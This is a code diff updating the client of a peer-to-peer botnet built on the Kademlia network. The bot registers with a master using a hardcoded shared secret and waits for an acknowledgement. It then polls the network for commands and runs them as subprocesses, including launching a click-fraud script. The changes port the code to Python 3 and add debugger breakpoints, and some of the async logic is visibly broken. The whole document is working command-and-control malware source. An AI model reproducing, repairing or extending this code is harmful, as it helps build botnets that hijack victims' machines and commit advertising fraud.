@@ -1,7 +1,10 @@
-import logging, sys, asyncio, subprocess, time, sys, hashlib, time
+import logging, sys, pdb
+import asyncio, subprocess, hashlib, socket
 from asyncio.tasks import ensure_future
 from kademlia.network import Server
 from collections import Counter
+
+SECRET="TheSecretKey"
 
 handler = logging.StreamHandler()
 formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
@@ -15,7 +18,7 @@ loop = asyncio.get_event_loop()
 loop.set_debug(True)   
 
 if len(sys.argv) != 4:
-    print("Usage: python bootstrapper.py <bootstrap ip> <bootstrap port> <bot port>")
+    print("Usage: python botnet_updated.py <bootstrap ip> <bootstrap port> <bot port>")
     exit(0)
 bootstrap_ip = str(sys.argv[1])
 port = int(sys.argv[2])
@@ -37,7 +40,7 @@ class botnode:
 
 def get_hash(prehash):
     m = hashlib.sha1()
-    m.update(prehash)
+    m.update(prehash.encode('utf-8'))
     return m.hexdigest()
 
 def most_common(list):
@@ -82,15 +85,17 @@ async def get_cmd(value, server, bot):
                 tmp = 'python clickFraud.py {0}'.format(' '.join(x[1:]))
                 print("Starting CLICKFRAUD on {0}".format(tmp))
                 process = subprocess.Popen(tmp.split(), shell=False)
-
     except Exception as e:
         pass
-
+    #pdb.set_trace()
+    await wait_cmd(server, bot)
 
 
 async def wait_cmd(server, bot):
     print("Checking for command")
-    loop.call_soon_threadsafe(get_cmd(server,bot), server.get(bot.cmdkey)) #.addCallback(get_cmd, server, bot))
+    pdb.set_trace()
+    loop.call_soon_threadsafe(get_cmd(server.get(bot.cmdkey), server,bot)) #.addCallback(get_cmd, server, bot))
+    asyncio.sleep(5)
 
 async def ack_valid(value, server, bot):
     # t = hashlib.sha1().update('ack')
@@ -99,36 +104,40 @@ async def ack_valid(value, server, bot):
         print("no ack")
     else:
         print("ack")
-        cmdloop = asyncio.create_task(wait_cmd(server, bot))
-        
+        pdb.set_trace()
+        await(wait_cmd(server, bot))
+        asyncio.sleep(5)
         #cmdloop.start(5)
         # wait_cmd(None,server,bot)
 
 async def check_ack(result, server, bot):
     mykey = hashlib.sha1()
-    mykey.update(bot.id)
-    await server.get(mykey.hexdigest())
-    await ack_valid(server,bot)
+    mykey.update(bot.id.encode('utf-8'))
+    idValue = await server.get(mykey.hexdigest())
+    print("ServerID: ",idValue)
+    #pdb.set_trace()
+    await ack_valid(idValue, server,bot)
     #ensure_future(ack_valid(server,bot))
     
 
 async def callhome(server, bot):
     key = hashlib.sha1()
-    key.update('specialstring')
+    key.update(SECRET.encode('utf-8'))
     # announce to master that we exist, then check for ack
-    await server.set(key.hexdigest(), str(bot.id))
-    await check_ack(server,bot)
+    result = await server.set(key.hexdigest(), str(bot.id))
+    print("Result of joining network",result)
+    #pdb.set_trace()
+    await check_ack(result, server, bot)
 
-async def setup(ip_list, server):
+async def setup(server):
     # check that it got a result back
     # print str(server.node.long_id)
-    if not len(ip_list):
-        print("Could not determine my ip, retrying")
-        loop.call_soon_threadsafe(setup, server)
-    myip = most_common(ip_list)
+    #Pull IP address from hostname of node #NOTE: This would be LAN IP and not WAN IP, can adjust code to reflect change if needed
+    myip = socket.gethostbyname(socket.gethostname())
     idhash = get_hash(str(server.node.long_id))
     #Create botNodes with Its IP, Port, Network Key (hashed), and Value (UUID)
     bot = botnode(myip, port, str(server.node.long_id), idhash)
+    #pdb.set_trace()
     await callhome(server, bot)
 
 async def bootstrapDone(server, key):
@@ -136,22 +145,25 @@ async def bootstrapDone(server, key):
     if type(result) == None:
         server.stop()
         print("Get result:",result, type(result))
+    print("Get result:",result, type(result))
+    #pdb.set_trace()
     await setup(server)
 
-    
+
 #SERVER ACTUALLY STARTS HERE*****************************************
 server = Server()
 #### KEY TO JOIN NETWORK ####
 key = hashlib.sha1()
-key.update('specialstring'.encode('utf-8'))
+key.update(SECRET.encode('utf-8'))
 keyhash = key.hexdigest()
 
 loop.run_until_complete(server.listen(myport))
 loop.run_until_complete(server.bootstrap([(bootstrap_ip, port)]))
-ensure_future(bootstrapDone(server, key))
-
+asyncio.sleep(5)
+#loop.run_until_complete(bootstrapDone(server, key))
+pdb.set_trace()
 try:
-    loop.run_forever()
+    loop.run_until_complete(bootstrapDone(server, key))
 except KeyboardInterrupt:
     pass
 finally:
